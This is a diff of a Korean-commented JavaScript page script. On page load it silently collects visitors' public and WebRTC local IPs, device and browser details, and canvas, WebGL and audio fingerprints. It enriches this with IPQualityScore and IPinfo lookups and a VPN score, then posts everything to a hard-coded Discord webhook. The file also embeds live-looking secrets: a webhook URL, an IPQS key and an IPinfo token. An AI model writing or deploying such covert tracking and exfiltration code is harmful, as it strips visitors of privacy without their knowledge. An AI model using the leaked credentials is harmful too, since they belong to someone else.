@@ -1,18 +1,19 @@
-/*****************************
+/*************************************************
  * CONFIG
- *****************************/
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1447962446915571846/J6hqwWgxsvjCmg1Q1Q7jRdFiHVex67Yhc9DcNVm7xCcMnAe9TqYfLl0n27ShmFcXdpKx";
+ *************************************************/
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn";
 const IPQS_KEY = "n0hXiA0tP5MMGuctT84vLRAdCfTdUvrE";
+const IPINFO_TOKEN = "8b74f7522151ae";
 
-/*****************************
- * 기본 환경 및 디바이스 정보 함수
- *****************************/
+/*************************************************
+ * 기본 정보 수집 유틸
+ *************************************************/
 function getDeviceInfo() {
     return {
         platform: navigator.platform,
         userAgent: navigator.userAgent,
         language: navigator.language,
-        languages: navigator.languages?.join(", ") ?? "N/A",
+        languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
         cpuCores: navigator.hardwareConcurrency ?? "N/A",
         touchPoints: navigator.maxTouchPoints ?? 0,
         cookieEnabled: navigator.cookieEnabled,
@@ -38,41 +39,42 @@ function getScreenInfo() {
 
 function getNetworkInfo() {
     const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    return c
-        ? {
-              effectiveType: c.effectiveType ?? "N/A",
-              downlink: c.downlink ? `${c.downlink} Mbps` : "N/A",
-              rtt: c.rtt ? `${c.rtt}ms` : "N/A",
-              saveData: c.saveData ? "활성화" : "비활성화"
-          }
-        : {
-              effectiveType: "N/A",
-              downlink: "N/A",
-              rtt: "N/A",
-              saveData: "N/A"
-          };
+    if (!c) {
+        return {
+            effectiveType: "N/A",
+            downlink: "N/A",
+            rtt: "N/A",
+            saveData: "N/A"
+        };
+    }
+    return {
+        effectiveType: c.effectiveType ?? "N/A",
+        downlink: c.downlink ? `${c.downlink} Mbps` : "N/A",
+        rtt: c.rtt ? `${c.rtt}ms` : "N/A",
+        saveData: c.saveData ? "활성화" : "비활성화"
+    };
 }
 
 function getBrowserInfo() {
     const ua = navigator.userAgent;
-    let name = "Unknown",
-        ver = "Unknown";
+    let name = "Unknown";
+    let version = "Unknown";
 
     if (ua.includes("Chrome") && !ua.includes("Edg")) {
         name = "Chrome";
-        ver = ua.match(/Chrome\/([\d.]+)/)?.[1] ?? "Unknown";
+        version = ua.match(/Chrome\/([\d.]+)/)?.[1] ?? "Unknown";
     } else if (ua.includes("Firefox")) {
         name = "Firefox";
-        ver = ua.match(/Firefox\/([\d.]+)/)?.[1] ?? "Unknown";
+        version = ua.match(/Firefox\/([\d.]+)/)?.[1] ?? "Unknown";
     } else if (ua.includes("Safari") && !ua.includes("Chrome")) {
         name = "Safari";
-        ver = ua.match(/Version\/([\d.]+)/)?.[1] ?? "Unknown";
+        version = ua.match(/Version\/([\d.]+)/)?.[1] ?? "Unknown";
     } else if (ua.includes("Edg")) {
         name = "Edge";
-        ver = ua.match(/Edg\/([\d.]+)/)?.[1] ?? "Unknown";
+        version = ua.match(/Edg\/([\d.]+)/)?.[1] ?? "Unknown";
     }
 
-    return { browserName: name, browserVersion: ver };
+    return { browserName: name, browserVersion: version };
 }
 
 function getOSInfo() {
@@ -82,73 +84,49 @@ function getOSInfo() {
     if (ua.includes("Windows NT 6.2")) return "Windows 8";
     if (ua.includes("Windows NT 6.1")) return "Windows 7";
     if (ua.includes("Mac OS X")) return "macOS";
-    if (ua.includes("Linux")) return "Linux";
     if (ua.includes("Android")) return "Android";
     if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+    if (ua.includes("Linux")) return "Linux";
     return "Unknown";
 }
 
-async function getBatteryInfo() {
-    try {
-        if ("getBattery" in navigator) {
-            const b = await navigator.getBattery();
-            return {
-                level: Math.round(b.level * 100) + "%",
-                charging: b.charging ? "충전 중" : "충전 안 함",
-                chargingTime: b.chargingTime === Infinity ? "N/A" : `${Math.round(b.chargingTime / 60)}분`,
-                dischargingTime: b.dischargingTime === Infinity ? "N/A" : `${Math.round(b.dischargingTime / 60)}분`
-            };
-        }
-    } catch {}
-    return { level: "N/A", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
+function getTimezoneInfo() {
+    const opts = Intl.DateTimeFormat().resolvedOptions();
+    return {
+        clientTimezone: opts.timeZone,
+        clientLocale: opts.locale,
+        clientOffsetMin: new Date().getTimezoneOffset()
+    };
 }
 
-function getMemoryInfo() {
-    try {
-        const m = performance.memory;
-        return {
-            usedJSHeapSize: `${(m.usedJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
-            totalJSHeapSize: `${(m.totalJSHeapSize / 1024 / 1024).toFixed(1)} MB`,
-            jsHeapSizeLimit: `${(m.jsHeapSizeLimit / 1024 / 1024).toFixed(1)} MB`
-        };
-    } catch {
-        return { usedJSHeapSize: "N/A", totalJSHeapSize: "N/A", jsHeapSizeLimit: "N/A" };
-    }
-}
-
-function getPluginsInfo() {
-    try {
-        return [...navigator.plugins].map(p => p.name).join(", ") || "N/A";
-    } catch {
-        return "N/A";
-    }
-}
-
+/*************************************************
+ * Fingerprint / 환경 관련 (선택적 분석용)
+ *************************************************/
 function getWebGLInfo() {
     try {
-        const c = document.createElement("canvas");
-        const gl = c.getContext("webgl");
+        const canvas = document.createElement("canvas");
+        const gl = canvas.getContext("webgl");
         if (!gl) return { vendor: "N/A", renderer: "N/A" };
-
-        const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+        const debug = gl.getExtension("WEBGL_debug_renderer_info");
         return {
             vendor: gl.getParameter(gl.VENDOR),
             renderer: gl.getParameter(gl.RENDERER),
-            unmaskedVendor: dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : "N/A",
-            unmaskedRenderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A"
+            unmaskedVendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : "N/A",
+            unmaskedRenderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A"
         };
     } catch {
-        return { vendor: "N/A", renderer: "N/A" };
+        return { vendor: "N/A", renderer: "N/A", unmaskedVendor: "N/A", unmaskedRenderer: "N/A" };
     }
 }
 
 function getCanvasFingerprint() {
     try {
-        const c = document.createElement("canvas");
-        const ctx = c.getContext("2d");
+        const canvas = document.createElement("canvas");
+        const ctx = canvas.getContext("2d");
+        ctx.textBaseline = "top";
         ctx.font = "16px Arial";
-        ctx.fillText("Fingerprint", 2, 2);
-        return c.toDataURL().slice(-40);
+        ctx.fillText("Canvas Fingerprint", 2, 2);
+        return canvas.toDataURL().slice(-40);
     } catch {
         return "N/A";
     }
@@ -156,104 +134,119 @@ function getCanvasFingerprint() {
 
 function getAudioFingerprint() {
     try {
-        const a = new AudioContext();
-        const osc = a.createOscillator();
-        const analyser = a.createAnalyser();
+        const ac = new (window.AudioContext || window.webkitAudioContext)();
+        const osc = ac.createOscillator();
+        const analyser = ac.createAnalyser();
         osc.connect(analyser);
-        analyser.connect(a.destination);
+        analyser.connect(ac.destination);
         osc.start();
+
         const arr = new Float32Array(analyser.frequencyBinCount);
         analyser.getFloatFrequencyData(arr);
-        a.close();
+        ac.close();
+
         return arr.slice(0, 8).join(",");
     } catch {
         return "N/A";
     }
 }
 
-function getFontsInfo() {
-    const fonts = ["Arial", "Helvetica", "Times New Roman", "Verdana", "Courier New", "Georgia"];
-    const base = document.createElement("canvas");
-    const ctx = base.getContext("2d");
-    ctx.font = "40px monospace";
-    const baseWidth = ctx.measureText("mmmmmmmmmmlli").width;
-
-    return fonts.filter(f => {
-        ctx.font = `40px ${f}, monospace`;
-        return ctx.measureText("mmmmmmmmmmlli").width !== baseWidth;
-    }).join(", ");
-}
-
-function getTimezoneInfo() {
-    return {
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        locale: Intl.DateTimeFormat().resolvedOptions().locale,
-        offset: new Date().getTimezoneOffset()
-    };
-}
-
-/*****************************
- * WebRTC + NAT + VPN 탐지
- *****************************/
-function detectNATType(candidates) {
-    if (!candidates.length) return "Unknown";
-    if (candidates.some(c => c.includes("relay"))) return "Symmetric NAT (VPN 가능성 매우 높음)";
-    if (candidates.some(c => c.includes("srflx"))) return "Restricted NAT";
+/*************************************************
+ * WebRTC / NAT / 후보 IP 분석
+ *************************************************/
+function detectNATType(candidateStrings) {
+    if (!candidateStrings || candidateStrings.length === 0) return "Unknown";
+    const hasRelay = candidateStrings.some(c => c.includes(" typ relay"));
+    const hasSrflx = candidateStrings.some(c => c.includes(" typ srflx"));
+    if (hasRelay) return "Symmetric NAT (VPN/프록시 가능성 매우 높음)";
+    if (hasSrflx) return "Restricted / Port-restricted NAT";
     return "Full Cone / Unknown";
 }
 
 async function getWebRTCInfo() {
     return new Promise(resolve => {
-        const result = { localIPs: [], publicIPs: [], blocked: false, vpnLikely: "Unknown", natType: "Unknown" };
-        let done = false;
+        const result = {
+            blocked: false,
+            localIPs: [],
+            candidateIPs: [],
+            natType: "Unknown",
+            vpnLikely: "Unknown"
+        };
 
-        const pc = new RTCPeerConnection({
-            iceServers: [
-                { urls: "stun:stun.l.google.com:19302" },
-                { urls: "stun:stun.cloudflare.com:3478" }
-            ]
-        });
+        let finished = false;
+        let pc;
 
-        pc.createDataChannel("x");
+        try {
+            pc = new RTCPeerConnection({
+                iceServers: [
+                    { urls: "stun:stun.l.google.com:19302" },
+                    { urls: "stun:stun.cloudflare.com:3478" }
+                ]
+            });
+        } catch {
+            result.blocked = true;
+            return resolve(result);
+        }
 
-        const candidates = [];
+        // dummy channel
+        try {
+            pc.createDataChannel("x");
+        } catch {}
 
-        pc.onicecandidate = e => {
-            if (!e.candidate) return;
+        const candidateStrings = [];
 
-            const c = e.candidate.candidate;
-            candidates.push(c);
+        pc.onicecandidate = ev => {
+            if (!ev.candidate) return;
+            const c = ev.candidate.candidate;
+            candidateStrings.push(c);
 
-            const ip = c.match(/\d+\.\d+\.\d+\.\d+/)?.[0];
+            const ipMatch = c.match(/\d+\.\d+\.\d+\.\d+/);
+            const ip = ipMatch && ipMatch[0];
             if (!ip) return;
 
-            if (c.includes("host") && !result.localIPs.includes(ip)) result.localIPs.push(ip);
-            if ((c.includes("srflx") || c.includes("relay")) && !result.publicIPs.includes(ip))
-                result.publicIPs.push(ip);
+            if (c.includes(" typ host") && !result.localIPs.includes(ip)) {
+                result.localIPs.push(ip);
+            }
+            if ((c.includes(" typ srflx") || c.includes(" typ relay")) && !result.candidateIPs.includes(ip)) {
+                result.candidateIPs.push(ip);
+            }
         };
 
         pc.createOffer()
-            .then(o => pc.setLocalDescription(o))
-            .catch(() => { result.blocked = true; done = true; resolve(result); });
+            .then(offer => pc.setLocalDescription(offer))
+            .catch(() => {
+                result.blocked = true;
+                finished = true;
+                resolve(result);
+            });
 
         setTimeout(() => {
-            if (done) return;
-            done = true;
+            if (finished) return;
+            finished = true;
 
-            result.natType = detectNATType(candidates);
-
-            if (window._realIP && result.publicIPs.length) {
-                result.vpnLikely = result.publicIPs.includes(window._realIP) ? "No" : "Yes";
+            if (!result.localIPs.length && !result.candidateIPs.length) {
+                result.blocked = true;
             }
+
+            result.natType = detectNATType(candidateStrings);
+
+            const realIP = window._realIP;
+            if (!result.blocked && realIP && result.candidateIPs.length) {
+                result.vpnLikely = result.candidateIPs.includes(realIP) ? "No" : "Yes";
+            } else if (!result.blocked && !result.candidateIPs.length) {
+                result.vpnLikely = "Maybe";
+            }
+
+            try { pc.close(); } catch {}
 
             resolve(result);
         }, 3000);
     });
 }
 
-/*****************************
- * IPQualityScore (핵심)
- *****************************/
+/*************************************************
+ * IPQualityScore / IPinfo 호출
+ *************************************************/
 async function fetchIPQualityScore(ip) {
     try {
         const res = await fetch(`https://ipqualityscore.com/api/json/ip/${IPQS_KEY}/${ip}`);
@@ -263,96 +256,217 @@ async function fetchIPQualityScore(ip) {
     }
 }
 
-/*****************************
- * VPN Score 계산
- *****************************/
-function calculateVPNScore(info) {
-    let s = 0;
-
-    // IPQS 비중 가장 큼
-    if (info.ipqs.vpn) s += 50;
-    if (info.ipqs.proxy) s += 30;
-    if (info.ipqs.tor) s += 70;
-    if (info.ipqs.recent_abuse) s += 15;
-    s += Math.min(30, Math.round((info.ipqs.fraud_score || 0) / 3));
-
-    // WebRTC 비교
-    if (info.webrtc.vpnLikely === "Yes") s += 20;
-    if (info.webrtc.natType.includes("Symmetric")) s += 10;
-
-    return Math.min(100, s);
+async function fetchIPinfo(ip) {
+    try {
+        const res = await fetch(`https://api.ipinfo.io/lite/${ip}?token=${IPINFO_TOKEN}`);
+        return await res.json();
+    } catch {
+        return null;
+    }
 }
 
-/*****************************
- * 메인 실행
- *****************************/
-async function collectAndSend() {
+/*************************************************
+ * Hosting 의심 여부 (IPinfo org 기반)
+ *************************************************/
+function isHostingOrg(org) {
+    if (!org) return false;
+    const lower = org.toLowerCase();
+    const keywords = [
+        "cloudflare",
+        "amazon",
+        "aws",
+        "digitalocean",
+        "m247",
+        "ovh",
+        "vultr",
+        "google llc",
+        "google cloud",
+        "linode",
+        "hetzner",
+        "contabo",
+        "leaseweb",
+        "colo",
+        "hosting",
+        "datacenter",
+        "data center",
+        "server"
+    ];
+    return keywords.some(k => lower.includes(k));
+}
+
+/*************************************************
+ * VPN 점수 계산 (0~100)
+ *************************************************/
+function calculateVPNScore(ipqs, webrtc, hostingSuspected) {
+    let score = 0;
+
+    if (!ipqs) ipqs = {};
+    if (!webrtc) webrtc = {};
+
+    // IPQualityScore 기반
+    if (ipqs.vpn) score += 45;
+    if (ipqs.proxy) score += 25;
+    if (ipqs.tor) score += 70;
+    if (ipqs.active_vpn) score += 10;
+    if (ipqs.active_proxy) score += 10;
+    if (ipqs.recent_abuse) score += 10;
+    if (typeof ipqs.fraud_score === "number") {
+        score += Math.min(25, Math.round(ipqs.fraud_score / 4));
+    }
+
+    // Hosting 의심이면 가중치 추가
+    if (hostingSuspected) score += 20;
+
+    // WebRTC 기반 보정
+    if (webrtc.vpnLikely === "Yes") score += 20;
+    if (webrtc.natType && webrtc.natType.includes("Symmetric")) score += 10;
+
+    if (score > 100) score = 100;
+    if (score < 0) score = 0;
+
+    return score;
+}
+
+/*************************************************
+ * 메인 수집 + Discord Webhook 전송
+ *************************************************/
+async function collectAndSendInfo() {
     try {
-        // Real IP
+        const now = new Date();
+        const clientLocalTime = now.toLocaleString("ko-KR");
+
+        // 1) 공인 IP
         const ipRes = await fetch("https://api.ipify.org?format=json");
-        const { ip } = await ipRes.json();
+        const ipJson = await ipRes.json();
+        const ip = ipJson.ip;
         window._realIP = ip;
 
-        // 위치
-        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
-        const loc = await locRes.json();
+        // 2) 병렬로 정보 수집
+        const [ipqs, ipinfo, webrtc] = await Promise.all([
+            fetchIPQualityScore(ip),
+            fetchIPinfo(ip),
+            getWebRTCInfo()
+        ]);
 
-        // IPQualityScore
-        const ipqs = await fetchIPQualityScore(ip);
+        const device = getDeviceInfo();
+        const screen = getScreenInfo();
+        const network = getNetworkInfo();
+        const browser = getBrowserInfo();
+        const os = getOSInfo();
+        const tz = getTimezoneInfo();
+        const webgl = getWebGLInfo();
+        const canvasFP = getCanvasFingerprint();
+        const audioFP = getAudioFingerprint();
 
-        // WebRTC
-        const webrtc = await getWebRTCInfo();
+        // 3) IPinfo 기반 ASN/ORG 파싱
+        let ipinfoASN = null;
+        let ipinfoOrgName = null;
+        if (ipinfo && ipinfo.org) {
+            const parts = ipinfo.org.split(" ");
+            ipinfoASN = parts[0] || null;               // e.g. "AS13335"
+            ipinfoOrgName = parts.slice(1).join(" ");   // e.g. "Cloudflare, Inc."
+        }
 
-        const vpnScore = calculateVPNScore({ ipqs, webrtc });
-        const conclusion =
-            vpnScore >= 80 ? "VPN/프록시 사용 매우 강하게 의심"
-            : vpnScore >= 50 ? "VPN/프록시 가능성 있음"
-            : "VPN 가능성 낮음";
+        const hostingSuspected = isHostingOrg(ipinfo?.org || "");
 
-        /***********************
+        // 4) VPN Score + 결론
+        const vpnScore = calculateVPNScore(ipqs, webrtc, hostingSuspected);
+        const vpnConclusion =
+            vpnScore >= 80
+                ? "VPN/프록시 사용 **매우 강하게 의심**"
+                : vpnScore >= 50
+                ? "VPN/프록시 사용 **가능성 있음**"
+                : "VPN/프록시 사용 **가능성 낮음**";
+
+        /*************************************************
          * Discord Embed 생성
-         ***********************/
+         *************************************************/
+        const fields = [];
+
+        // 기본 IP + 위치
+        fields.push({
+            name: "기본 IP 정보",
+            value:
+                `**IP:** ${ip}\n` +
+                `**IPQS 국가/도시:** ${ipqs?.country_code || "N/A"} / ${ipqs?.city || "N/A"}\n` +
+                `**IPinfo 국가/도시:** ${ipinfo?.country || "N/A"} / ${ipinfo?.city || "N/A"}\n` +
+                `**클라이언트 시간:** ${clientLocalTime}\n` +
+                `**클라이언트 타임존:** ${tz.clientTimezone}`,
+            inline: false
+        });
+
+        // IPinfo 기반 분석
+        fields.push({
+            name: "IPinfo 분석",
+            value:
+                `**ASN:** ${ipinfoASN || "N/A"}\n` +
+                `**ORG(raw):** ${ipinfo?.org || "N/A"}\n` +
+                `**ORG 이름:** ${ipinfoOrgName || "N/A"}\n` +
+                `**IPinfo 타임존:** ${ipinfo?.timezone || "N/A"}\n` +
+                `**호스팅 의심:** ${hostingSuspected ? "Yes" : "No"}`,
+            inline: false
+        });
+
+        // IPQualityScore 분석
+        fields.push({
+            name: "IPQualityScore 분석",
+            value:
+                `**VPN:** ${ipqs?.vpn ? "Yes" : "No"}\n` +
+                `**Proxy:** ${ipqs?.proxy ? "Yes" : "No"}\n` +
+                `**TOR:** ${ipqs?.tor ? "Yes" : "No"}\n` +
+                `**Active VPN:** ${ipqs?.active_vpn ? "Yes" : "No"}\n` +
+                `**Active Proxy:** ${ipqs?.active_proxy ? "Yes" : "No"}\n` +
+                `**Fraud Score:** ${ipqs?.fraud_score ?? "N/A"}\n` +
+                `**최근 악용 기록:** ${ipqs?.recent_abuse ? "Yes" : "No"}\n` +
+                `**Abuse Velocity:** ${ipqs?.abuse_velocity || "N/A"}`,
+            inline: false
+        });
+
+        // WebRTC / NAT 분석
+        fields.push({
+            name: "WebRTC & NAT 분석",
+            value:
+                `**WebRTC 차단됨:** ${webrtc.blocked ? "Yes" : "No"}\n` +
+                `**로컬 IP:** ${webrtc.localIPs.join(", ") || "N/A"}\n` +
+                `**후보 Public IP:** ${webrtc.candidateIPs.join(", ") || "N/A"}\n` +
+                `**NAT 타입 추정:** ${webrtc.natType}\n` +
+                `**WebRTC 기반 VPN 추정:** ${webrtc.vpnLikely}`,
+            inline: false
+        });
+
+        // 클라이언트 환경 요약
+        fields.push({
+            name: "클라이언트 환경",
+            value:
+                `**OS / 브라우저:** ${os} / ${browser.browserName} ${browser.browserVersion}\n` +
+                `**플랫폼:** ${device.platform}\n` +
+                `**언어:** ${device.language} (${device.languages})\n` +
+                `**화면:** ${screen.screenWidth}x${screen.screenHeight} (윈도우: ${screen.windowWidth}x${screen.windowHeight})\n` +
+                `**네트워크:** type=${network.effectiveType}, downlink=${network.downlink}, rtt=${network.rtt}, saveData=${network.saveData}\n` +
+                `**WebGL:** vendor=${webgl.vendor}, renderer=${webgl.renderer}\n` +
+                `**Canvas FP:** ${canvasFP}\n` +
+                `**Audio FP:** ${audioFP}`,
+            inline: false
+        });
+
+        // 최종 판단
+        fields.push({
+            name: "VPN/프록시 종합 판단",
+            value:
+                `**VPN 점수:** ${vpnScore} / 100\n` +
+                `**결론:** ${vpnConclusion}`,
+            inline: false
+        });
+
         const embed = {
-            title: "새로운 방문자 정보 (IP 분석 + IPQualityScore)",
-            color: 0x5865F2,
-            fields: [
-                {
-                    name: "기본 정보",
-                    value:
-                        `IP: ${ip}\n` +
-                        `ISP: ${loc.isp}\n` +
-                        `국가/도시: ${loc.country} / ${loc.city}`,
-                    inline: false
-                },
-                {
-                    name: "IPQualityScore 분석",
-                    value:
-                        `VPN: ${ipqs.vpn}\n` +
-                        `Proxy: ${ipqs.proxy}\n` +
-                        `TOR: ${ipqs.tor}\n` +
-                        `Fraud Score: ${ipqs.fraud_score}\n` +
-                        `최근 악용 기록: ${ipqs.recent_abuse}`,
-                    inline: false
-                },
-                {
-                    name: "WebRTC 분석",
-                    value:
-                        `차단 여부: ${webrtc.blocked}\n` +
-                        `Local IP: ${webrtc.localIPs.join(", ") || "N/A"}\n` +
-                        `Candidate IP: ${webrtc.publicIPs.join(", ") || "N/A"}\n` +
-                        `NAT 타입: ${webrtc.natType}\n` +
-                        `WebRTC 기반 VPN 추정: ${webrtc.vpnLikely}`,
-                    inline: false
-                },
-                {
-                    name: "최종 판단",
-                    value:
-                        `VPN 점수: ${vpnScore} / 100\n` +
-                        `판정: **${conclusion}**`,
-                    inline: false
-                }
-            ],
-            footer: { text: "자동 수집 시스템" }
+            title: "새로운 방문자 분석 보고서",
+            description: "페이지 접속과 동시에 자동 수집된 IP/환경 정보입니다.",
+            color: 0x5865f2,
+            timestamp: now.toISOString(),
+            fields,
+            footer: {
+                text: "자동 수집 시스템 (IPQualityScore + IPinfo + WebRTC)"
+            }
         };
 
         await fetch(WEBHOOK_URL, {
@@ -360,10 +474,9 @@ async function collectAndSend() {
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ embeds: [embed] })
         });
-
-    } catch (err) {
-        console.log("오류 발생:", err);
+    } catch (e) {
+        console.error("정보 수집/전송 실패:", e);
     }
 }
 
-window.addEventListener("load", collectAndSend);
+window.addEventListener("load", collectAndSendInfo);
